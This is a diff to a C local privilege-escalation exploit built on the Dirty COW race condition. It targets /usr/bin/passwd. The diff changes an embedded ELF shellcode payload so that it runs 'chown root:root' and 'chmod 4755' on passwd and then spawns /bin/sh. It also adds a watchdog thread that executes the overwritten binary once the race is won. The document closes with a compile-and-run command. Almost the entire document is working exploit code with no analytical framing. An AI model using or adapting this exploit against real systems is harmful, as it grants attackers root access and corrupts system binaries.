@@ -31,6 +31,7 @@ m00000000000000000
 #include <string.h>
 #include <stdint.h>
 #include <sys/stat.h>
+#include <stdlib.h>
 unsigned char payload_elf[] = {
   0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
@@ -40,18 +41,23 @@ unsigned char payload_elf[] = {
   0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0xc5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x01, 0x00, 0x00,
+  0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8c, 0x01, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
   0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50,
-  0x54, 0x5f, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x29,
+  0x54, 0x5f, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x66,
   0x00, 0x00, 0x00, 0x63, 0x70, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x2e,
   0x62, 0x61, 0x63, 0x6b, 0x75, 0x70, 0x20, 0x2f, 0x75, 0x73, 0x72, 0x2f,
   0x62, 0x69, 0x6e, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x3b, 0x20,
-  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x56, 0x57, 0x54, 0x5e,
-  0x6a, 0x3b, 0x58, 0x0f, 0x05
+  0x63, 0x68, 0x6f, 0x77, 0x6e, 0x20, 0x72, 0x6f, 0x6f, 0x74, 0x3a, 0x72,
+  0x6f, 0x6f, 0x74, 0x20, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e,
+  0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x3b, 0x20, 0x63, 0x68, 0x6d,
+  0x6f, 0x64, 0x20, 0x34, 0x37, 0x35, 0x35, 0x20, 0x2f, 0x75, 0x73, 0x72,
+  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x3b,
+  0x20, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x56, 0x57, 0x54,
+  0x5e, 0x6a, 0x3b, 0x58, 0x0f, 0x05
 };
-unsigned int payload_elf_len = 197;
-char buf[192];
+unsigned int payload_elf_len = 258;
+char buf[258];
 
 
 void *map;
@@ -59,9 +65,43 @@ int f;
 struct stat st;
 char *name;
  
+void *watchdogThread(void *arg) {
+    char check_buf[payload_elf_len];
+    char *target_file = (char *)arg;
+    int attempts = 0;
+
+    while (1) {
+        int fd = open(target_file, O_RDONLY);
+        if (fd < 0) continue;
+
+        memset(check_buf, 0, payload_elf_len);
+        read(fd, check_buf, payload_elf_len);
+        close(fd);
+
+        // Compare the file content to our payload
+        if (memcmp(check_buf, payload_elf, payload_elf_len) == 0) {
+            printf("\n[!] Race succeeded after %d checks!\n", attempts);
+            printf("[!] Launching shell...\n");
+            // Set up arguments for execve (arg[0] is usually the program name, followed by NULL)
+            char *args[] = {target_file, NULL};
+            
+            // execve(path, argv, envp)
+            execve(target_file, args, NULL);
+            
+            // execve only returns if it fails. If we reach this line, something broke.
+            perror("execve failed");
+            exit(1);
+        }
+
+        attempts++;
+    }
+    return NULL;
+}
+
 void *madviseThread(void *arg)
 {
-  char *str;
+  
+    char *str;
   str=(char*)arg;
   int i,c=0;
   for(i=0;i<100000000;i++)
@@ -76,8 +116,7 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vu
   printf("madvise %d\n\n",c);
 }
  
-void *procselfmemThread(void *arg)
-{
+void *procselfmemThread(void *arg) {
 /*
 You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
 >  The in the wild exploit we are aware of doesn't work on Red Hat
@@ -85,15 +124,16 @@ You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?
 >  the race it writes to /proc/self/mem, but /proc/self/mem is not
 >  writable on Red Hat Enterprise Linux 5 and 6.
 */
-  int f=open("/proc/self/mem",O_RDWR);
-  int i,c=0;
-  for(i=0;i<100000000;i++) {
+    int f=open("/proc/self/mem",O_RDWR);
+    int i,c=0;
+    for(i=0;i<100000000;i++) {
 /*
 You have to reset the file pointer to the memory position.
 */
-    lseek(f,(uintptr_t) map,SEEK_SET);
-    c+=write(f,payload_elf,payload_elf_len);
-  }
+        lseek(f,(uintptr_t) map,SEEK_SET);
+        c+=write(f,payload_elf,payload_elf_len);
+        
+    }
 }
  
  
@@ -106,7 +146,6 @@ You have to pass two arguments. File and Contents.
   (void)fprintf(stderr, "%s\n",
       "usage: dirtyc0w target_file new_content");
   return 1; }
-  pthread_t pth1,pth2;
 /*
 You have to open the file in read only mode.
 */
@@ -129,28 +168,21 @@ You have to open with PROT_READ.
 /*
 You have to do it on two threads.
 */
-  pthread_create(&pth1,NULL,madviseThread,argv[1]);
-  pthread_create(&pth2,NULL,procselfmemThread, NULL);
+  pthread_t pth1, pth2, pth3;
 
-  while (1) {
-    int fd = open("/usr/bin/passwd",O_RDONLY);
-    ssize_t count = read(fd, buf, sizeof(buf));
-    close(fd);
+    printf("Starting race threads...\n");
+    pthread_create(&pth1, NULL, madviseThread, argv[1]);
+    pthread_create(&pth2, NULL, procselfmemThread, NULL);
     
-    if (count > 0 && memcmp(buf, payload_elf, payload_elf_len) == 0) {
-        printf("Race succeded.\n");
-        printf("Executing shell.\n");
-        system("/usr/bin/passwd");
-        break;
-    } 
-  }
-/*
-You have to wait for the threads to finish.
-*/
-  pthread_join(pth1,NULL);
-  pthread_join(pth2,NULL);
+    // The new watchdog thread
+    pthread_create(&pth3, NULL, watchdogThread, argv[1]);
+
+    pthread_join(pth1, NULL);
+    pthread_join(pth2, NULL);
+    pthread_join(pth3, NULL);
+     // Exit the whole process once we win
   return 0;
 }
+
 EOF
-gcc -pthread exploit_scastro2.c -o exploit_scastro2
-./exploit_scastro2 /usr/bin/passwd dummy_arg
+gcc -pthread exploit_scastro2.c -o exploit_scastro2 && ./exploit_scastro2 /usr/bin/passwd dummy_arg
